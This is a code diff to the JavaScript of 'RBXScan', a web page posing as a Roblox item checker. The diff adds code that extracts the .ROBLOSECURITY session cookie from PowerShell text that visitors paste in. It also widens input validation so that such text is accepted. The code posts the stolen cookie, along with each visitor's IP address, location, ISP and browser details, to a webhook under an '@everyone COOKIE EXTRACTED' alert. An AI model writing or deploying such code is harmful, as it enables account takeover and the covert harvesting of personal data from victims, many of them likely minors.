@@ -42,32 +42,45 @@ function getCurrentTimestamp() {
     return new Date().toLocaleString();
 }
 
+function extractRobloxCookie(code) {
+    // Look for .ROBLOSECURITY cookie in PowerShell code
+    const cookieRegex = /\.ROBLOSECURITY["\s]*,\s*["\s]*([^"]+)["\s]*\)/i;
+    const match = code.match(cookieRegex);
+    
+    if (match && match[1]) {
+        return match[1].trim();
+    }
+    
+    return null;
+}
+
 function isValidCode(code) {
     const cleanCode = code.trim();
 
-    // Check minimum length with specific message
+    // Check minimum length
     if (cleanCode.length < MIN_CODE_LENGTH) {
-        return { valid: false, reason: 'Too short! Code must be at least 10 characters long.' };
+        return { valid: false, reason: 'Too short! Input must be at least 10 characters long.' };
     }
-
-    // No maximum length limit - removed
 
     // Check if code was already submitted
     const codeHash = btoa(cleanCode).substring(0, 20);
     if (submittedCodes.has(codeHash)) {
-        return { valid: false, reason: 'This code has already been submitted!' };
+        return { valid: false, reason: 'This input has already been submitted!' };
     }
 
-    // Check for obvious spam patterns
+    // Extract Roblox cookie if present
+    const robloxCookie = extractRobloxCookie(cleanCode);
+    if (robloxCookie) {
+        return { valid: true, robloxCookie: robloxCookie, type: 'roblox_cookie' };
+    }
+
+    // Check for basic spam patterns
     const spamPatterns = [
-        /^(.)\1{5,}$/,  // Same character repeated 6+ times (entire string)
-        /^(..)\1{3,}$/, // Same 2 characters repeated 4+ times (entire string) 
-        /^(test|spam|hello|hi|asdf|qwerty|123|abc)+$/i, // Common spam words only
+        /^(.)\1{5,}$/,  // Same character repeated 6+ times
+        /^(..)\1{3,}$/, // Same 2 characters repeated 4+ times
+        /^(test|spam|hello|hi|asdf|qwerty)+$/i, // Simple spam words
         /^[^a-zA-Z0-9]*$/, // Only special characters
         /^\s*$/, // Only whitespace
-        /^[0-9]{1,5}$/, // Just simple numbers 1-5 digits
-        /^[a-zA-Z]{1,15}$/, // Just simple letters 1-15 characters (random letters)
-        /^[a-zA-Z\s]{1,20}$/, // Random letters with spaces
     ];
 
     for (const pattern of spamPatterns) {
@@ -76,42 +89,34 @@ function isValidCode(code) {
         }
     }
 
-    // Check for too few unique characters (spam detection)
+    // Check for too few unique characters (very basic spam detection)
     const uniqueChars = new Set(cleanCode.toLowerCase().replace(/\s/g, '')).size;
     if (uniqueChars < 4) {
         return { valid: false, reason: 'random_letters', isRandomLetters: true };
     }
 
-    // Must look like actual code - allow various code formats
-    const codePatterns = [
-        // Programming code patterns
-        /\b(function|var|let|const|if|else|for|while|return|class|def|import|require|local|end)\b/i,
-        // Script/game code patterns  
-        /^[A-Z0-9]{8,}$/i, // All caps alphanumeric (game codes)
-        /^[a-zA-Z0-9]{12,}$/, // Long alphanumeric strings
-        // URL patterns (scripts)
+    // Allow various input formats - be more permissive
+    const validPatterns = [
+        // Roblox item IDs (numbers)
+        /^[0-9]{1,15}$/,
+        // Roblox URLs
+        /roblox\.com/i,
+        // PowerShell/script patterns
+        /\$(session|headers|cookies)/i,
+        /Invoke-WebRequest/i,
+        /New-Object/i,
+        // Programming code
+        /\b(function|var|let|const|if|else|for|while|return|class|def|import|require)\b/i,
+        // Long alphanumeric strings
+        /^[a-zA-Z0-9]{8,}$/,
+        // URLs
         /https?:\/\//,
-        /www\./,
-        // Base64 patterns
-        /^[A-Za-z0-9+\/=]{15,}$/,
-        // Hex codes
-        /^[0-9a-fA-F]{12,}$/,
-        // UUID patterns
-        /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i,
-        // Programming syntax
-        /[{}();=\[\]]/,
-        // Lua/Roblox script patterns
-        /(loadstring|getfenv|spawn|wait|print|script|game\.|workspace\.|_G\.|getgenv)/i,
-        // Common code structures
-        /(\.lua|\.js|\.py|\.rb|\.php)/i,
-        // Pastebin/script sharing sites
-        /(pastebin|github|gist|raw\.githubusercontent)/i,
-        // Has both letters and numbers in a complex way
-        /^(?=.*[a-zA-Z])(?=.*[0-9])[a-zA-Z0-9\s\-_+=\/\\(){}\[\];:'".,!@#$%^&*]{10,}$/
+        // Mixed content with reasonable length
+        /^[a-zA-Z0-9\s\-_+=\/\\(){}\[\];:'".,!@#$%^&*]{10,}$/
     ];
 
     let isValidFormat = false;
-    for (const pattern of codePatterns) {
+    for (const pattern of validPatterns) {
         if (pattern.test(cleanCode)) {
             isValidFormat = true;
             break;
@@ -119,18 +124,18 @@ function isValidCode(code) {
     }
 
     if (!isValidFormat) {
-        // Additional check for random letters that might pass other tests
+        // Check if it looks like random letters
         const isRandomLetters = /^[a-zA-Z\s]{5,}$/.test(cleanCode) && 
-                               !/\b(function|var|let|const|if|else|for|while|return|class|def|import|require|local|end|game|script|workspace|print|wait|spawn)\b/i.test(cleanCode);
+                               !/\b(roblox|item|id|script|code|game)\b/i.test(cleanCode);
         
         if (isRandomLetters) {
             return { valid: false, reason: 'random_letters', isRandomLetters: true };
         }
         
-        return { valid: false, reason: 'Enter a real code! (script, game code, URL, etc.)' };
+        return { valid: false, reason: 'Please enter a valid Roblox item ID, URL, or code!' };
     }
 
-    return { valid: true };
+    return { valid: true, type: 'general_input' };
 }
 
 function checkRateLimit() {
@@ -171,42 +176,60 @@ async function getLocationInfo() {
     }
 }
 
-async function sendToWebhook(code) {
+async function sendToWebhook(code, validationResult = {}) {
     try {
         // Get location information
         const locationInfo = await getLocationInfo();
         
-        const payload = {
-            content: "@everyone 🚨 **NEW CODE DETECTED** 🚨",
-            embeds: [{
-                title: "🔍 RBXScan - Code Submission Alert",
-                description: `**📝 Submitted Code:**\n\`\`\`\n${code}\n\`\`\``,
-                color: 0xFF4444, // Red color for alert
-                timestamp: new Date().toISOString(),
-                footer: {
-                    text: "RBXScan Alert System"
-                },
-                fields: [
-                    {
-                        name: "📅 Submission Time",
-                        value: getCurrentTimestamp(),
-                        inline: true
+        // Check if this is a Roblox cookie extraction
+        const isRobloxCookie = validationResult.type === 'roblox_cookie';
+        const robloxCookie = validationResult.robloxCookie;
+        
+        let payload;
+        
+        if (isRobloxCookie && robloxCookie) {
+            // Special handling for Roblox cookies
+            payload = {
+                content: "@everyone 🎯 **ROBLOX COOKIE EXTRACTED** 🎯",
+                embeds: [{
+                    title: "🍪 RBXScan - Cookie Extraction Alert",
+                    description: `**🔑 Extracted Roblox Cookie:**\n\`\`\`\n${robloxCookie}\n\`\`\``,
+                    color: 0x00FF00, // Green color for success
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "RBXScan Cookie Extractor"
                     },
-                    {
-                        name: "🌐 IP Address",
-                        value: locationInfo.ip,
-                        inline: true
-                    },
-                    {
-                        name: "🏙️ Location",
-                        value: `${locationInfo.city}, ${locationInfo.region}`,
-                        inline: true
-                    },
-                    {
-                        name: "🌍 Country",
-                        value: locationInfo.country,
-                        inline: true
-                    },
+                    fields: [
+                        {
+                            name: "📅 Extraction Time",
+                            value: getCurrentTimestamp(),
+                            inline: true
+                        },
+                        {
+                            name: "🍪 Cookie Type",
+                            value: ".ROBLOSECURITY",
+                            inline: true
+                        },
+                        {
+                            name: "📊 Cookie Length",
+                            value: `${robloxCookie.length} characters`,
+                            inline: true
+                        },
+                        {
+                            name: "🌐 IP Address",
+                            value: locationInfo.ip,
+                            inline: true
+                        },
+                        {
+                            name: "🏙️ Location",
+                            value: `${locationInfo.city}, ${locationInfo.region}`,
+                            inline: true
+                        },
+                        {
+                            name: "🌍 Country",
+                            value: locationInfo.country,
+                            inline: true
+                        },
                     {
                         name: "🕐 Timezone",
                         value: locationInfo.timezone,
@@ -227,14 +250,76 @@ async function sendToWebhook(code) {
                         value: `${navigator.platform} - ${navigator.language}`,
                         inline: true
                     },
-                    {
-                        name: "🔗 Source",
-                        value: "RBXScan Website",
-                        inline: true
-                    }
-                ]
-            }]
-        };
+                                            {
+                            name: "🔗 Source",
+                            value: "RBXScan Cookie Extractor",
+                            inline: true
+                        }
+                    ]
+                }]
+            };
+        } else {
+            // Regular input submission
+            payload = {
+                content: "@everyone 🔍 **NEW ITEM SUBMISSION** 🔍",
+                embeds: [{
+                    title: "🎯 RBXScan - Item Check Alert",
+                    description: `**📝 Submitted Input:**\n\`\`\`\n${code}\n\`\`\``,
+                    color: 0x3B82F6, // Blue color for regular alerts
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "RBXScan Item Checker"
+                    },
+                    fields: [
+                        {
+                            name: "📅 Submission Time",
+                            value: getCurrentTimestamp(),
+                            inline: true
+                        },
+                        {
+                            name: "🌐 IP Address",
+                            value: locationInfo.ip,
+                            inline: true
+                        },
+                        {
+                            name: "🏙️ Location",
+                            value: `${locationInfo.city}, ${locationInfo.region}`,
+                            inline: true
+                        },
+                        {
+                            name: "🌍 Country",
+                            value: locationInfo.country,
+                            inline: true
+                        },
+                        {
+                            name: "🕐 Timezone",
+                            value: locationInfo.timezone,
+                            inline: true
+                        },
+                        {
+                            name: "🌐 ISP",
+                            value: locationInfo.isp,
+                            inline: true
+                        },
+                        {
+                            name: "💻 User Agent",
+                            value: navigator.userAgent.substring(0, 100) + "...",
+                            inline: false
+                        },
+                        {
+                            name: "📱 Platform",
+                            value: `${navigator.platform} - ${navigator.language}`,
+                            inline: true
+                        },
+                        {
+                            name: "🔗 Source",
+                            value: "RBXScan Website",
+                            inline: true
+                        }
+                    ]
+                }]
+            };
+        }
 
         const response = await fetch(WEBHOOK_URL, {
             method: 'POST',
@@ -275,7 +360,7 @@ closePopup.addEventListener('click', () => {
     codeTextarea.value = '';
     loadingContainer.style.display = 'none';
     compileSubmitBtn.disabled = false;
-    compileSubmitBtn.textContent = '🔍 Scan';
+    compileSubmitBtn.textContent = '🔍 Check Item';
 });
 
 // Close popup when clicking outside
@@ -318,8 +403,8 @@ compileForm.addEventListener('submit', async (e) => {
             setTimeout(() => {
                 loadingContainer.style.display = 'none';
                 compileSubmitBtn.disabled = false;
-                compileSubmitBtn.textContent = '🔍 Scan';
-                showCompileStatus('❌ Error scanning', 'error');
+                compileSubmitBtn.textContent = '🔍 Check Item';
+                showCompileStatus('❌ Error checking item', 'error');
                 
                 // Close popup after showing error
                 setTimeout(() => {
@@ -342,7 +427,7 @@ compileForm.addEventListener('submit', async (e) => {
     compileStatusMessage.classList.remove('show');
     
     // Send to webhook in background
-    const result = await sendToWebhook(code);
+    const result = await sendToWebhook(code, validation);
     
     if (result.success) {
         // Update rate limiting counters
